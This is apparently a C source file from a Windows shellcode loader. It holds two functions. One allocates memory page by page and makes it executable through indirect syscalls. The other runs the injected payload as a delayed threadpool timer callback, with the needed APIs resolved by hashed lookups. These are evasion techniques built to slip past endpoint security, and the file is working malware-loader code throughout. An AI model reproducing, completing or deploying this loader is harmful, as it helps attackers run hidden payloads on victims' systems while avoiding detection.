#include <windows.h>

#include "Structs.h"
#include "Common.h"
#include "FunctionPointers.h"
#include "Debug.h"

extern NT_API g_Nt;

#define		PAGE_SIZE					4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )

// Function to inject a payload into the process
BOOL InjectPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload)
{
	NTSTATUS	STATUS           = 0x00;
	SIZE_T		sNewPayloadSize  = SET_TO_MULTIPLE_OF_4096(sPayloadSize);
	SIZE_T 		sChunkSize       = PAGE_SIZE;
	DWORD		ii               = sNewPayloadSize / PAGE_SIZE;
	DWORD		dwOldPermissions = 0x00;
	PVOID		pAddress         = NULL;
	PVOID		pTmpAddress      = NULL;
	PBYTE		pTmpPayload      = NULL;

	// Check if the NT API is initialized
	if (!g_Nt.bInit) {
		return FALSE;
	}

	// Adjust payload size to include an extra page
	sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;
	
	// Allocate virtual memory with read-only permissions
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY))) {
#ifdef DEBUG
		PRINT("[!] NtAllocateVirtualMemory[1] Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	// Adjust base address and size to leave a read-only page behind
	sNewPayloadSize = sNewPayloadSize - PAGE_SIZE;
	pAddress = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);

	pTmpAddress = pAddress;

	// Commit memory with read-write permissions
	for (DWORD i = 0; i < ii; i++) {
		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE))) {
#ifdef DEBUG
			PRINT("[!] NtAllocateVirtualMemory[2][%d] Failed With Error: 0x%0.8X - %s.%d \n", i, STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}
	pTmpAddress = pAddress;

	// Change memory permissions to execute-read-write
	for (DWORD i = 0; i < ii; i++) {
		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions))) {
#ifdef DEBUG
			PRINT("[!] NtProtectVirtualMemory[%d] Failed With Error: 0x%0.8X - %s.%d \n", i, STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	//---------------------------------------------------------------------------------------------------------------------------------------------

	// Start writing the payload from the base address
	pTmpAddress = pAddress;
	pTmpPayload = pPayloadBuffer;

	// Write the payload into the allocated memory
	for (DWORD i = 0; i < ii; i++) {
		Memcpy(pTmpAddress, pTmpPayload, PAGE_SIZE);

		pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + PAGE_SIZE);
		pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
	}
	*pInjectedPayload = pAddress;
	return TRUE;
}

// Function to execute the injected payload
VOID ExecutePayload(IN PVOID pInjectedPayload) {

	TP_CALLBACK_ENVIRON		tpCallbackEnv = { 0 };
	FILETIME				FileDueTime = { 0 };
	ULARGE_INTEGER			ulDueTime = { 0 };
	PTP_TIMER				ptpTimer = NULL;

	// Check if the payload is valid
	if (!pInjectedPayload)
		return;

	// Get function pointers for thread pool timer functions
	fnCreateThreadpoolTimer				pCreateThreadpoolTimer = (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_CH), CreateThreadpoolTimer_CH);
	fnSetThreadpoolTimer				pSetThreadpoolTimer = (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_CH), SetThreadpoolTimer_CH);
	fnWaitForSingleObject				pWaitForSingleObject = (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32dll_CH), WaitForSingleObject_CH);

	// Check if function pointers were successfully retrieved
	if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject) {
#ifdef DEBUG
		PRINT("[!] Failed To Fetch One Or More Function Pointers - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif 
		return;
	}

	// Initialize the thread pool environment
	InitializeThreadpoolEnvironment(&tpCallbackEnv);

	// Create a thread pool timer to execute the payload
	if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv))) {
#ifdef DEBUG
		PRINT("[!] CreateThreadpoolTimer Failed With Error: %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		return;
	}

	// Set the timer to trigger after a specified delay
	ulDueTime.QuadPart = (ULONGLONG)-(PAYLOAD_EXECUTION_DELAY * 10 * 1000 * 1000);
	FileDueTime.dwHighDateTime = ulDueTime.HighPart;
	FileDueTime.dwLowDateTime = ulDueTime.LowPart;

	pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);

	// Wait indefinitely for the timer to trigger
	pWaitForSingleObject((HANDLE)-1, INFINITE);
}